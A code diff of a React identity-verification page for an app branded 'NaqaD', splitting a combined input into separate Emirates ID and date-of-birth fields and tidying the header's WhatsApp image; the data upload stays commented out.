@@ -3,11 +3,12 @@ import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { useNavigate } from "react-router-dom";
 import Logo from "@/assets/logo.png";
-import Whatsapp from "@/assets/whatsapp.jpg";
+import Whatsapp from "@/assets/whatsapp.png";
 // import { uploadData } from "@/firebase/FirebaseUtils"; // 🔥 keep for later
 
 const DOB = () => {
-  const [inputValue, setInputValue] = useState("");
+  const [emiratesId, setEmiratesId] = useState("");
+  const [dob, setDob] = useState("");
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();
 
@@ -17,9 +18,9 @@ const DOB = () => {
     // 🔥 Firestore upload (disabled for now)
     /*
     try {
-      await uploadData({ dobOrEmiratesId: inputValue });
+      await uploadData({ emiratesId, dob });
     } catch (error) {
-      console.error("Error saving DOB/Emirates ID:", error);
+      console.error("Error saving data:", error);
     }
     */
 
@@ -37,26 +38,40 @@ const DOB = () => {
           <img src={Logo} alt="Logo" className="w-10 h-10" />
           <span className="text-2xl font-bold">NaqaD</span>
         </div>
-        <button className="absolute right-0">
-          <img src={Whatsapp} alt="Whatsapp" className="w-10 h-10 rounded-full" />
-        </button>
+        <img
+          src={Whatsapp}
+          alt="Whatsapp"
+          className="w-8 h-8 rounded-full absolute right-0"
+        />
       </div>
 
       {/* Main content */}
       <div className="w-full flex flex-col mt-10 flex-1">
         <h1 className="text-xl font-semibold">Verify Yourself</h1>
-        <p className="text-sm text-gray-500">Enter Emirates ID or Date of Birth</p>
+        <p className="text-sm text-gray-500">Enter Emirates ID and Date of Birth</p>
 
+        {/* Emirates ID Input */}
         <div className="w-full mt-6">
-          <label className="block text-sm text-gray-700 mb-2">
-            Emirates ID / Date of Birth
-          </label>
+          <label className="block text-sm text-gray-700 mb-2">Emirates ID</label>
           <div className="flex items-center border rounded-lg px-3 py-2">
             <Input
-              value={inputValue}
-              onChange={(e) => setInputValue(e.target.value)}
-              placeholder="Enter Emirates ID or DOB"
-              className="border-0 focus:ring-0 flex-1 p-0"
+              value={emiratesId}
+              onChange={(e) => setEmiratesId(e.target.value)}
+              placeholder="Enter Emirates ID"
+              className="border-0 focus:ring-0 flex-1 p-0 shadow-none"
+            />
+          </div>
+        </div>
+
+        {/* Date of Birth Input */}
+        <div className="w-full mt-4">
+          <label className="block text-sm text-gray-700 mb-2">Date of Birth</label>
+          <div className="flex items-center border rounded-lg px-3 py-2">
+            <Input
+              type="date"
+              value={dob}
+              onChange={(e) => setDob(e.target.value)}
+              className="border-0 focus:ring-0 flex-1 p-0 shadow-none"
             />
           </div>
         </div>
